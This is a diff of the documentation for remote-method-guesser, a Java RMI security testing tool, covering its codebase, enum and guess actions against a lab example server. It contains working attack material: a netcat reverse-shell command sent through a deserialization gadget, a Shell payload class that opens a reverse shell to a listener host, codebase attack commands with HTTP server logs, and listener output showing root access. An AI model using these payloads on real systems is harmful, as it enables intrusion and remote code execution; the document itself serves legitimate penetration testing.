@@ -2,184 +2,25 @@
 
 ----
 
-In this document you can find more detailed information on the different available *rmg* actions.
+In this document you can find additional information for some of *remote-method-guesser's* actions.
 
-* [act](#activator-action)
-* [bind|rebind|unbind](#bind-actions)
-* [codebase](#codbase-action)
+* [codebase](#codebase-action)
 * [enum](#enum-action)
 * [guess](#guess-action)
-* [reg|dgc](#registry-and-dgc-actions)
-
-
-### Activator Action
-
-----
-
-One crucial part of remote method invocation on *Java RMI* endpoints are *RemoteObjects*. A *RemoteObject* is basically an instance of
-a class that is made available over the network. Each *RemoteObject* which is registered in the current runtime is associated with
-a corresponding ``ObjID``. During a *RMI call*, the *RMI client* sends all required information for the call, together with the
-``ObjID`` for the desired *RemoteObject* to the server. The server looks up the ``ObjID`` value and dispatches the call to the
-corresponding *RemoteObject*.
-
-*RMI clients* usually obtain the ``ObjID`` for a *RemoteObject* in two different ways:
-
-  1. Well known *RemoteObjects* (those that are used for internal RMI communication), have fixed and well known ``ObjID`` values.
-  2. Other *RemoteObjects* are usually obtained using the *RMI registry*, which provides the ``ObjID`` values during the object lookup.
-
-The probably most well known *well known RemoteObjects* are the *RMI registry* (``ObjID = 0``) and the *distributed garbage collector* (``ObjID = 2``),
-but there is one other well known *RemoteObject* that is no longer that well known. This *RemoteObject* is the *activator* (``ObjID = 1``)
-that was (not sure if really true, but at least some references mention that) once a mandatory part of *Java RMI*, but became optional in
-*Java 8* [1](https://openjdk.java.net/jeps/385). From here on, it was no longer commonly used and the amount of reliable documentation and
-projects that still use it is quite low. From the small amount of documentation that is available [2](https://docs.oracle.com/javase/9/docs/specs/rmi/activation.html)
-we conclude that the *activation system* is used for the following purpose:
-
-It seems to allow the creation of *RemoteObjects* on demand. With regular *Java RMI*, the client obtains a *remote reference* from the
-*RMI registry* that points to an existing *RemoteObject*. When the corresponding *RemoteObject* does not exist, regular *RMI calls* simply
-lead to a ``ConnectException`` or ``NoSuchObjectException``. However, with an ``Activator`` present, the situation is a little bit different,
-as clients obtain not only a *remote reference*, but also an ``ActivationID`` when looking up a *RemoteObject*.
-
-The ``ActivationID`` can now be used to create *RemoteObjects* on demand. When a client dispatches a *RMI call*, it first tries to
-dispatch it directly using the *remote reference* for the corresponding *Remote Object*. When this call fails, it sends an *activate
-request* to the ``Activator``, containing the ``ActivationID`` it obtained previously. The ``Activator`` can now create the object
-and return the new *remote reference* back to the client (as already mentioned, this explanation is probably not fully correct and
-misses many details, but it is sufficient for our purpose).
-
-**TL;DR** - The ``Activator`` is just another well known *RemoteObject* with a fixed ``ObjID`` and known *remote methods*. The reason why it
-is interesting from an offensive perspective is, because it did never profit from *JEP290* and still uses no deserialization filters.
-As it's only *remote method* ``activate`` takes a non primitive argument, it is a prime target for deserialization attacks.
-Since version ``v3.1`` the *rmg-example-server* runs an ``Activator`` remote object on the ``9010`` registry port.
-The following listing shows an example *deserialization attack*:
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 act CommonsCollections6 'nc 172.17.0.1 4444 -e ash'
-[+] Creating ysoserial payload... done.
-[+] 
-[+] Attempting deserialization attack on Activation endpoint...
-[+] 
-[+] 	Caught IllegalArgumentException during deserialization attack.
-[+] 	Deserialization attack was probably successful :)
-
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:46499.
-id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-Apart from being vulnerable to *deserialization attacks*, the ``Activator`` can also be vulnerable to remote class loading attacks.
-For this attack to work, the ``ActivationSystem`` needs to run with ``useCodebaseOnly=false`` and a security policy that allows
-the requested operation. The default implementation for the *activation system* (``rmid``) uses the same *SecurityManager* as the
-*RMI registry*. Therefore, pulling classes from remote is always allowed.
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature act
-[+] Attempting codebase attack on Activator endpoint...
-[+] Using class Shell with codebase http://172.17.0.1:8000/ during activate call.
-
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:31:28] "GET /Shell.class HTTP/1.1" 200 -
-
-[qtc@kali ~]$ nc -vlp 4444
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:36110.
-id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-
-### Bind Actions
-
-----
-
-By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
-During these actions *remote-method-guesser* just makes legitimate usage of the corresponding *remote methods* that are exposed by the
-registry and calls them in the intended way. On a fully patched server, this should only work from localhost, as the *RMI registry*
-validates the incoming client connection against all local IP addresses. An exception for this situation are servers that are vulnerable
-to ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform bind operations. To use this bypass
-technique, you need to specify ``--localhost-bypass`` together with the corresponding *bind action*.
-
-Whereas the ``unbind`` action only requires the *bound name* that should be removed from the registry, the ``bind`` and ``rebind`` operations
-also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
-for this purpose, which is the *RemoteObject* normally used by *jmx* servers. As *jmx* is part of the most common *Java Runtime Environments*,
-it is likely that the registry can bind this object. Notice that arbitrary objects cannot be bound, as they need to be known by the *RMI registry*.
-Nonetheless, you can attempt to bind arbitrary objects by using *rmg's* [Plugin System](./plugin-system.md).
-
-*RemoteObjects* within the *RMI registry* are actually just references to their corresponding *TCP endpoints*. For this reason, during the ``bind``
-and ``rebind`` operations, you have to specify an address for the corresponding endpoint. Clients that attempt to communicate with your
-*bound name* as well as the *RMI registry* itself will sent *JRMP calls* to the specified endpoint from time to time. Depending on the server or
-client configuration, this can be used for *deserialization attacks*.
-
-```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- plain-server
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 bind 172.17.0.1:4444 --bound-name jmxrmi --localhost-bypass
-[+] Binding name jmxrmi to javax.management.remote.rmi.RMIServerImpl_Stub
-[+] 
-[+] 	Encountered no Exception during bind call.
-[+] 	Bind operation was probably successful.
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- plain-server
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 unbind --bound-name plain-server --localhost-bypass
-[+] Ubinding bound name plain-server from the registry.
-[+] 
-[+] 	Encountered no Exception during unbind call.
-[+] 	Unbind operation was probably successful.
-
-[qtc@kali ~]$ rmg 172.17.0.2 9010 
-[+] RMI registry bound names:
-[+] 
-[+] 	- jmxrmi
-[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
-[+] 	- plain-server2
-[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
-[+] 	- legacy-service
-[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
-[...]
-```
 
 
 ### Codebase Action
 
 ------
 
-In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
-This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class
-(not known by the server) within *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
-on most *Java RMI* servers.
+In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within *Java RMI*.
+This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class,
+that is not known by the server, during *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
+on most *Java RMI* endpoints.
 
-Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
-lax configured security policy. Unfortunately, common security tools like e.g. *Metasploit* use a wrong approach for testing this vulnerability, as they
-are still targeting the *Distributed Garbage Collector* (*DGC*) and look for the string ``RMI class loader disabled``, which is returned if no security manager
-is used. On modern *RMI endpoints*, such an enumeration is no longer working for the following reasons:
+Despite being fixed in the default configuration, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false``
+and uses a *SecurityManager* with a lax configured security policy. Unfortunately, the current tool landscape for *Java RMI* does not include reliable checks for
+this vulnerability. Most tools focus on the *Distributed Garbage Collector*, which is not ideal for the following reasons:
 
 1. The *Distributed Garbage Collector* sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
    ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.
@@ -193,7 +34,8 @@ is used. On modern *RMI endpoints*, such an enumeration is no longer working for
    classes are rejected while reading the ``ObjectInputStream``. Whereas the *RMI registry* allows unknown classes that implement certain interfaces, the *DGC*
    uses a more strict *deserialization filter* and it is not possible to send unknown classes to it.
 
-For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. A little bit better is the
+For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. It can be used to detect whether a
+*Security Manager* is used, but that is only one of the mandatory conditions for being vulnerable to codebase attacks. A little bit better is the
 situation for the *RMI registry*. The *RMI registry* still respects a user defined ``useCodebaseOnly`` setting and uses a *SecurityManager* that allows outbound
 connections by default. Therefore, a setting of ``useCodebaseonly=false`` is already sufficient to load classes from remote. However, there are two downsides:
 
@@ -204,6 +46,9 @@ connections by default. Therefore, a setting of ``useCodebaseonly=false`` is alr
    argument of the ``lookup(String name)`` method was unmarshalled via ``readObject``. However, on most recent *RMI registries* you can only use the ``bind``
    and ``rebind`` methods, that can only be invoked from localhost.
 
+3. The *RMI registry* uses an security manager by default only in it's default implementation. When the *RMI registry* is created manually, no security manager
+   is created by default.
+
 Whereas the *internal RMI communications* (*DGC* and *RMI registry*) are well protected, *RMI communication* on the application level is not. A server configured
 with ``useCodebaseonly=false`` and a lax configured *SecurityManager* might be exploitable, but you need to know a valid method signature. Furthermore, also
 on the application level it is required that the *remote method* leads to a call to ``readObject`` on the server side. Therefore, the targeted remote method
@@ -211,22 +56,21 @@ needs non primitive input parameters. As in case of the registry, ``java.lang.St
 newer ones. The following listing shows an example for a successful codebase attack:
 
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
-[+] Class de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub is treated as legacy stub.
-[+] You can use --no-legacy to prevent this.
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --signature 'String login(java.util.HashMap dummy1)' --bound-name legacy-service
 [+] Attempting codebase attack on RMI endpoint...
 [+] Using class Shell with codebase http://172.17.0.1:8000/ during login call.
-[+] 
+[+]
 [+] 	Using non primitive argument type java.util.HashMap on position 0
 [+] 	Specified method signature is String login(java.util.HashMap dummy1)
+[+]
 ```
 
 When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:
 
 ```console
-[qtc@kali ~]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:46:41] "GET /Shell.class HTTP/1.1" 200 -
+172.17.0.2 - - [01/Dec/2021 07:36:10] "GET /Shell.class HTTP/1.1" 200 -
 ```
 
 *remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
@@ -242,12 +86,13 @@ import java.net.Socket;
 import java.util.jar.Attributes;
 import java.io.Serializable;
 import java.io.ObjectInputStream;
+import java.rmi.Remote;
 
-public class Shell implements Serializable
+public class Shell implements Serializable, Remote
 {
     private static int port = 4444;
     private static String cmd = "/bin/ash";
-    private static String host = "172.18.0.1";
+    private static String host = "172.17.0.1";
     private static final long serialVersionUID = 2L;
 
     private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
@@ -286,7 +131,7 @@ public class Shell implements Serializable
 After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:
 
 ```console
-[qtc@kali ~]$ nc -vlp 4444
+[qtc@devbox ~]$ nc -vlp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -296,21 +141,25 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-As previously mentioned, the internal *DGC communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
+As previously mentioned, the internal *RMI communication* of modern *RMI endpoints* is hardened against *codebase* and *deserialization attacks*.
 Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
 vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
 endpoints, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.
 
+However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
+by the deserialization filters of the *RMI registry*. This is why the above mentioned payload class needs to implement ``java.rmi.Remote``.
+Without implementing this interface, the class would have been rejected by the *RMI registry*.
+
 ```console
-[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature reg
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --component reg
 [+] Attempting codebase attack on RMI Registry endpoint...
 [+] Using class Shell with codebase http://172.17.0.1:8000/ during lookup call.
 
-[qtc@kali www]$ python3 -m http.server
+[qtc@devbox www]$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.17.0.2 - - [27/Mar/2021 06:49:52] "GET /Shell.class HTTP/1.1" 200 -
+172.17.0.2 - - [01/Dec/2021 07:38:04] "GET /Shell.class HTTP/1.1" 200 -
 
-[qtc@kali ~]$ nc -vlp 4444
+[qtc@devbox ~]$ nc -vlp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -320,37 +169,84 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
-by the deserialization filters of the *RMI registry*. The following listing shows the modifications applied to the ``Shell`` class
-in the example above:
-
-```java
-[...]
-import java.rmi.Remote;
-
-public class Shell implements Serializable, Remote
-[...]
-```
-
 
 ### Enum Action
 
 ------
 
-The ``enum`` action is *rmg's* base action and basically performs an *RMI vulnerability scan*. In this section,
-the different checks of the ``enum`` action and it's outputs are explained in more detail:
+In this section, the different checks of the ``enum`` action and it's outputs are explained in more detail:
 
 
 #### Bound Name Enumeration
 
-The bound name enumeration should be self explanatory. In this check *rmg* simply obtains a list of bound names
-registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the class or interface
-name that is used when dispatching calls to the corresponding bound name. Obtained class names are printed
-and marked as either *known* or *unknown*. The *unknown* marker means that the corresponding *remote class* is not
-available within your own classpath. As the amount of default *remote classes* within a *JRE* is quite limited and
-most *RMI endpoints* use custom *remote classes*, this marker should appear the majority of times. However, for some
-well known services like *JMX* you may also encounter the *known* marker, as the ``RMIServerImpl_Stub`` class that
-is used by *JMX* is available on your *JRE* as well.
+The bound name enumeration should be self explanatory. In this check *remote-method-guesser* simply obtains a
+list of bound names registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the
+class or interface name that is used when dispatching calls to the corresponding bound name. Obtained class names
+are printed and marked as either *known* or *unknown*. *remote-method-guesser* contains a database of known *RMI*
+classes. These are classes that have been encountered before and for which certain meta information is available.
+Corresponding class names can be used in *remote-method-guesser's* ``known`` action to view the stored meta information:
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 6
+[+] RMI registry bound names:
+[+]
+[+] 	- jmxrmi
+[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
+[+] 		    Endpoint: iinsecure.dev:42222 ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
+[+]
+[qtc@devbox ~]$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
+[+] Name:
+[+] 	JMX Server
+[+]
+[+] Class Name:
+[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
+[+] 	- javax.management.remote.rmi.RMIServer
+[+]
+[+] Description:
+[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
+[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
+[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
+[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
+[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
+[+]
+[+] Remote Methods:
+[+] 	- String getVersion()
+[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
+[+]
+[+] References:
+[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
+[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
+[+]
+[+] Vulnerabilities:
+[+]
+[+] 	-----------------------------------
+[+] 	Name:
+[+] 		MLet
+[+]
+[+] 	Description:
+[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
+[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
+[+] 		is therefore most of the time equivalent to remote code execution.
+[+]
+[+] 	References:
+[+] 		- https://github.com/qtc-de/beanshooter
+[+]
+[+] 	-----------------------------------
+[+] 	Name:
+[+] 		Deserialization
+[+]
+[+] 	Description:
+[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
+[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
+[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
+[+] 		establish a working JMX connection, you can also perform deserialization attacks.
+[+]
+[+] 	References:
+[+] 		- https://github.com/qtc-de/beanshoote
+```
+
+Apart from the bound names and the class information, *remote-method-guesser* displays information on the remote
+objects ``ObjID`` and the corresponding *RMI endpoint* the bound name is referring to.
 
 
 #### Codebase Enumeration
@@ -368,11 +264,19 @@ As with client specified codebases, remote class loading is always a security ri
 developing applications that use *Java RMI* for client-server communication, you usually already compile all required classes
 and interface definitions into the client. Exposing a server-side codebase is therefore usually not required.
 
-*rmg* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
+*remote-method-guesser* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
 encountering a  ``HTTP`` based server-side codebase can be huge deal. It may allows you to download class definitions
 that expose information about the *RMI* endpoint. Sometimes you also find codebases that rely on the ``file`` protocol.
 While not being that useful without server access, a ``file`` based codebase still reveals internal paths that could
 be useful for other attacks as well.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3 
+[+] RMI server codebase enumeration:
+[+]
+[+] 	- http://iinsecure.dev/well-hidden-development-folder/
+[+]
+```
 
 
 #### String Marshalling
@@ -385,12 +289,21 @@ In *June 2020*, the unmarshalling behavior of the ``String`` type [was changed](
 Instead of unmarshalling ``String`` via ``readObject``, the ``String`` type is now read via ``readString`` on modern
 *RMI* endpoints. This prevents certain attack types on remote methods that only accept ``String`` typed arguments.
 
-*rmg* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
+*remote-method-guesser* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
 outputs during its enumeration:
 
 * **Current Default**: The ``String`` type is unmarshalled via ``readString``.
 * **Outdated**: The ``String`` type is unmarshalled via ``readObject``, which usually means that the corresponding
   *RMI endpoint* is out of date.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling 
+[+] RMI server String unmarshalling enumeration:
+[+]
+[+] 	- Caught ClassNotFoundException during lookup call.
+[+] 	  --> The type java.lang.String is unmarshalled via readObject().
+[+] 	  Configuration Status: Outdated
+```
 
 
 #### useCodebaseOnly Enumeration
@@ -405,6 +318,24 @@ one of the following results:
 Notice that the second status was intentionally not named **Vulnerable**, as the actual exploitability depends on the settings
 of the ``SecurityManager``. Please refer to the [codebase action](#codebase-action) section for more details.
 
+The codebase enumeration is implemented by sending a malformed *URL* as client side codebase during *RMI calls*. When
+*useCodebaseOnly* is set to *false* (and a *SecurityManager* is present), the server attempts to parse the malformed *URL*
+and throws a corresponding exception. This makes the codebase enumeration very reliable.
+
+Codebase enumeration is only supported for registry endpoints, since the *DGC* is not suitable for an reliable enumeration
+(see [codebase action](#codebase-action)). Furthermore, the ``String`` type needs to be unmarshalled via ``readObject``.
+If this is not the case, you can still enumerate the *useCodebaseOnly* setting from localhost *RMI endpoints* by using a different
+method than ``lookup`` in the ``--registry-method`` option.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase 
+[+] RMI server useCodebaseOnly enumeration:
+[+]
+[+] 	- Caught MalformedURLException during lookup call.
+[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
+[+] 	  Configuration Status: Non Default
+```
+
 
 #### CVE-2019-2684 Enumeration
 
@@ -417,22 +348,36 @@ either of the following:
 * **Non Vulnerable**: The vulnerability is patched.
 * **Vulnerable**: The server is vulnerable (can be confirmed by using e.g. *rmg's* ``bind`` action.
 
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass 
+[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+[+]
+[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
+[+] 	  Vulnerability Status: Vulnerable
+```
 
-#### DGC Enumeration
 
-The *DGC* enumeration is basically a legacy check that is no longer really useful. As detailed in the [codebase section](#codebase-action),
-the *DGC* uses it's own hardening settings with very strict configurations regarding deserialization and usage of codebases.
-The check performs basically a codebase enumeration on the *DGC* and inspects the corresponding exception message. The message is compared
-to some known values and one of the following status is printed:
+#### Security Manager Enumeration
 
-* **Non Default**: The *DGC* attempted to parse the codebase (``useCodebaseOnly=false``). This also means that the *Java RMI* endpoint
-  is way outdated (2012).
-* **Outdated**: The **DGC** complained about a missing security manager. This exception message is used by older *RMI* endpoints. The
-  *DGC* itself is not vulnerable, but you may find vulnerabilities on other *RMI components*.
-* **Current Default**: The *DGC* rejected access to the classloader, which is default for most current *DGC* implementations.
+The *security manager enumeration* is what other *RMI tools* do during their *codebase* enumeration. It uses calls to the
+*Distributed Garbage Collector* to verify whether a security manager is present on the server side.
 
-To clarify: I would not rely on this check e.g. for reporting it as a vulnerability. The check is outdated and only left in place because
-it is already implemented. In rare situations, the result can be interesting, but most of the time it should be ignored.
+* **Current Default**: Is displayed when the enumeration is successful, independent of the result (*SecurityManager* present or not).
+  Whether a *SecurityManager* is present can be read from the status message.
+* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used. 
+  As explained in the [codebase-action](#codebase-action) section, this is usually pointless, but for very old *DGC* instances
+  it can still work. The *DGC* when attempts to parse the malformed codebase and throws an exception. The endpoint is marked
+  as **Outdated** in this case.
+
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager 
+[+] RMI Security Manager enumeration:
+[+]
+[+] 	- Security Manager rejected access to the class loader.
+[+] 	  --> The server does use a Security Manager.
+[+] 	  Configuration Status: Current Default
+```
 
 
 #### JEP 290 Enumeration
@@ -442,6 +387,14 @@ to the *DGC* and inspects the returned exception message. The corresponding resu
 
 * **Non Vulnerable**: *JEP 290* is installed and the *DGC* rejected the deserialization.
 * **Vulnerable**: The ``java.util.HashMap`` object was deserialized and the endpoint is vulnerable to deserialization attacks.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290 
+[+] RMI server JEP290 enumeration:
+[+]
+[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
+[+] 	  Vulnerability Status: Non Vulnerable
+```
 
 
 #### JEP 290 Bypass Enumeration
@@ -457,6 +410,14 @@ with an invalid set of arguments. Depending on the corresponding exception messa
 Notice that for this enumeration technique to work from remote, the *RMI registry* must use ``readObject`` to unmarshal the ``String`` type.
 From localhost, you can also enumerate servers that use ``readString``, by using e.g. the ``--reg-method bind`` option.
 
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass 
+[+] RMI registry JEP290 bypass enmeration:
+[+]
+[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
+[+] 	  Vulnerability Status: Vulnerabl
+```
+
 
 #### Activation System Enumeration
 
@@ -465,6 +426,15 @@ This enumeration tells you whether an activator instance is available on the tar
 
 * **Current Default**: No activator object is present.
 * **Vulnerable**: An activator is present and allows deserialization and probably codebase attacks.
+
+```console
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator 
+[+] RMI ActivationSystem enumeration:
+[+]
+[+] 	- Caught IllegalArgumentException during activate call (activator is present).
+[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
+[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
+```
 
 
 ### Guess Action
@@ -491,7 +461,7 @@ or ``--wordlist-folder`` options. Methods with zero arguments are skipped by def
 invocation cannot be prevented by using invalid argument types.
 
 ```console
-[qtc@kali ~]$ rmg --ssl --zero-arg 172.18.0.2 1090 guess
+[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --zero-arg 
 [+] Reading method candidates from internal wordlist rmg.txt
 [+] 	752 methods were successfully parsed.
 [+] Reading method candidates from internal wordlist rmiscout.txt
@@ -501,29 +471,30 @@ invocation cannot be prevented by using invalid argument types.
 [+]
 [+] 	MethodGuesser is running:
 [+] 		--------------------------------
-[+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
-[+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
-[+] 		[ ssl-server    ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
-[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
-[+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
 [+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
-[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
+[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
+[+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
+[+] 		[ ssl-server    ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
+[+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
+[+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
 [+] 		[ secure-server ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
+[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
+[+] 		[9882 / 9882] [#####################################] 100%
 [+] 	done.
 [+]
 [+] Listing successfully guessed methods:
 [+]
 [+] 	- plain-server
-[+] 		--> String system(String dummy, String[] dummy2)
 [+] 		--> String execute(String dummy)
-[+] 	- secure-server
-[+] 		--> void logMessage(int dummy1, Object dummy2)
-[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
-[+] 		--> String login(java.util.HashMap dummy1)
+[+] 		--> String system(String dummy, String[] dummy2)
 [+] 	- ssl-server
 [+] 		--> String system(String[] dummy)
-[+] 		--> int execute(String dummy)
 [+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
+[+] 		--> int execute(String dummy)
+[+] 	- secure-server
+[+] 		--> void logMessage(int dummy1, Object dummy2)
+[+] 		--> String login(java.util.HashMap dummy1)
+[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
 ```
 
 To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
@@ -540,119 +511,3 @@ boolean call(String[] dummy); -4301784332653484516; false; false
 
 To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
 operation. This will update all currently used wordlist files to the optimized format.
-
-
-### Registry and DGC Actions
-
-------
-
-Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote* methods that are needed for the internal *RMI communication*.
-In the old days (before *JEP 290*), these internal *remote methods* were vulnerable to exactly the same deserialization attacks as described above. However,
-with *JEP 290* deserialization filters were implemented for all internal *RMI communication* and deserialization attacks were (theoretically) no longer possible. 
-
-During it's *enum* action, *remote-method-guesser* already checks whether *JEP290* is installed on the targeted server. For testing purposes you can use the
